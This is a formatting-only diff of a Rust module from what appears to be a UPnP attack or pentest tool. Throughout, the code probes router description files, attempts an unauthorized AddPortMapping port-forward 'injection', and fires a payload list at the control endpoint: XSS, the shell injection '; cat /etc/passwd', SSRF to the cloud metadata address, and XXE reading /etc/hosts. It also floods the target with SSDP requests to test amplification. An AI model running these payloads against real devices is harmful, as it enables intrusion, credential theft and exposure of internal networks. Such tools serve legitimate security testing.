@@ -3,7 +3,11 @@ use reqwest::Client;
 use std::time::Duration;
 
 fn build_client(timeout: u64) -> Client {
-    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
+    Client::builder()
+        .timeout(Duration::from_secs(timeout))
+        .redirect(reqwest::redirect::Policy::none())
+        .build()
+        .unwrap_or_else(|_| Client::new())
 }
 
 pub async fn discover(url: &str, timeout: u64) -> anyhow::Result<()> {
@@ -21,21 +25,29 @@ pub async fn discover(url: &str, timeout: u64) -> anyhow::Result<()> {
         println!("  {} UPnP service detected", "[+]".green().bold());
     }
 
-    let discovery_paths = ["/rootDesc.xml", "/xml/device_description.xml", "/gatedesc.xml", "/devicedesc.xml", "/IGD.xml"];
+    let discovery_paths = [
+        "/rootDesc.xml",
+        "/xml/device_description.xml",
+        "/gatedesc.xml",
+        "/devicedesc.xml",
+        "/IGD.xml",
+    ];
     for path in &discovery_paths {
         let target = format!("{}{}", url.trim_end_matches('/'), path);
-        match client.get(&target).send().await {
-            Ok(r) => {
-                let status = r.status().as_u16();
-                let text = r.text().await.unwrap_or_default();
-                if status == 200 && !text.is_empty() {
-                    println!("  {} {:30} — {} bytes", "[+]".green().bold(), path, text.len());
-                    if text.contains("deviceType") || text.contains("friendlyName") {
-                        println!("    {} Device description exposed", "[!]".red().bold());
-                    }
+        if let Ok(r) = client.get(&target).send().await {
+            let status = r.status().as_u16();
+            let text = r.text().await.unwrap_or_default();
+            if status == 200 && !text.is_empty() {
+                println!(
+                    "  {} {:30} — {} bytes",
+                    "[+]".green().bold(),
+                    path,
+                    text.len()
+                );
+                if text.contains("deviceType") || text.contains("friendlyName") {
+                    println!("    {} Device description exposed", "[!]".red().bold());
                 }
             }
-            Err(_) => {}
         }
     }
 
@@ -49,16 +61,31 @@ pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout);
-    let control_endpoints = ["/upnp/control/WANIPConn1", "/upnp/control/WANPPPConn1", "/upnp/control/Layer3Fwd1", "/soap"];
+    let control_endpoints = [
+        "/upnp/control/WANIPConn1",
+        "/upnp/control/WANPPPConn1",
+        "/upnp/control/Layer3Fwd1",
+        "/soap",
+    ];
     for ep in &control_endpoints {
         let target = format!("{}{}", url.trim_end_matches('/'), ep);
-        match client.post(&target).header("Content-Type", "text/xml").body("<s:Envelope></s:Envelope>").send().await {
+        match client
+            .post(&target)
+            .header("Content-Type", "text/xml")
+            .body("<s:Envelope></s:Envelope>")
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
                 if status == 200 || status == 500 {
                     if text.contains("GetExternalIPAddress") || text.contains("AddPortMapping") {
-                        println!("  {} {:35} — CONTROL ENDPOINT ACTIVE", "[!]".red().bold(), ep);
+                        println!(
+                            "  {} {:35} — CONTROL ENDPOINT ACTIVE",
+                            "[!]".red().bold(),
+                            ep
+                        );
                     } else {
                         println!("  {} {:35} — status={}", "[-]".dimmed(), ep, status);
                     }
@@ -81,10 +108,23 @@ pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
 </s:Envelope>"#;
 
     let target = format!("{}/upnp/control/WANIPConn1", url.trim_end_matches('/'));
-    if let Ok(r) = client.post(&target).header("Content-Type", "text/xml").header("SOAPAction", "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"").body(add_port).send().await {
+    if let Ok(r) = client
+        .post(&target)
+        .header("Content-Type", "text/xml")
+        .header(
+            "SOAPAction",
+            "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"",
+        )
+        .body(add_port)
+        .send()
+        .await
+    {
         let status = r.status().as_u16();
         if status == 200 {
-            println!("\n  {} Port mapping injection — SUCCESS", "[!]".red().bold());
+            println!(
+                "\n  {} Port mapping injection — SUCCESS",
+                "[!]".red().bold()
+            );
         }
     }
 
@@ -99,16 +139,41 @@ pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
 
     let client = build_client(timeout);
     let payloads = [
-        ("XSS in description", r#"<NewPortMappingDescription><script>alert(1)</script></NewPortMappingDescription>"#),
-        ("Command inject", r#"<NewInternalClient>; cat /etc/passwd</NewInternalClient>"#),
-        ("SSRF via client", r#"<NewInternalClient>http://169.254.169.254/latest/meta-data/</NewInternalClient>"#),
-        ("XXE inject", r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><NewInternalClient>&xxe;</NewInternalClient>"#),
+        (
+            "XSS in description",
+            r#"<NewPortMappingDescription><script>alert(1)</script></NewPortMappingDescription>"#,
+        ),
+        (
+            "Command inject",
+            r#"<NewInternalClient>; cat /etc/passwd</NewInternalClient>"#,
+        ),
+        (
+            "SSRF via client",
+            r#"<NewInternalClient>http://169.254.169.254/latest/meta-data/</NewInternalClient>"#,
+        ),
+        (
+            "XXE inject",
+            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><NewInternalClient>&xxe;</NewInternalClient>"#,
+        ),
     ];
 
     for (name, payload) in &payloads {
-        let soap = format!(r#"<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">{}</u:AddPortMapping></s:Body></s:Envelope>"#, payload);
+        let soap = format!(
+            r#"<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">{}</u:AddPortMapping></s:Body></s:Envelope>"#,
+            payload
+        );
         let target = format!("{}/upnp/control/WANIPConn1", url.trim_end_matches('/'));
-        match client.post(&target).header("Content-Type", "text/xml").header("SOAPAction", "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"").body(soap).send().await {
+        match client
+            .post(&target)
+            .header("Content-Type", "text/xml")
+            .header(
+                "SOAPAction",
+                "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"",
+            )
+            .body(soap)
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
                 let text = r.text().await.unwrap_or_default();
@@ -137,22 +202,51 @@ pub async fn flood(url: &str, timeout: u64) -> anyhow::Result<()> {
     let mut errors = 0u32;
 
     for i in 0..200u32 {
-        let target = if i % 2 == 0 { format!("{}", url) } else { format!("{}/ssdp", url.trim_end_matches('/')) };
-        match client.post(&target).header("Content-Type", "text/plain").body(ssdp_payload).send().await {
+        let target = if i % 2 == 0 {
+            url.to_string()
+        } else {
+            format!("{}/ssdp", url.trim_end_matches('/'))
+        };
+        match client
+            .post(&target)
+            .header("Content-Type", "text/plain")
+            .body(ssdp_payload)
+            .send()
+            .await
+        {
             Ok(r) => {
                 let status = r.status().as_u16();
-                if status == 200 { sent += 1; } else { errors += 1; }
+                if status == 200 {
+                    sent += 1;
+                } else {
+                    errors += 1;
+                }
             }
-            Err(_) => { errors += 1; }
+            Err(_) => {
+                errors += 1;
+            }
         }
         if i % 50 == 0 && i > 0 {
-            println!("  {} Progress: {} sent, {} errors", "*".cyan(), sent, errors);
+            println!(
+                "  {} Progress: {} sent, {} errors",
+                "*".cyan(),
+                sent,
+                errors
+            );
         }
     }
 
-    println!("\n  {} Results: {} sent, {} errors", "[*]".cyan().bold(), sent, errors);
+    println!(
+        "\n  {} Results: {} sent, {} errors",
+        "[*]".cyan().bold(),
+        sent,
+        errors
+    );
     if sent > 150 {
-        println!("  {} Amplification possible — server responded to most requests.", "[!]".red().bold());
+        println!(
+            "  {} Amplification possible — server responded to most requests.",
+            "[!]".red().bold()
+        );
     }
 
     Ok(())
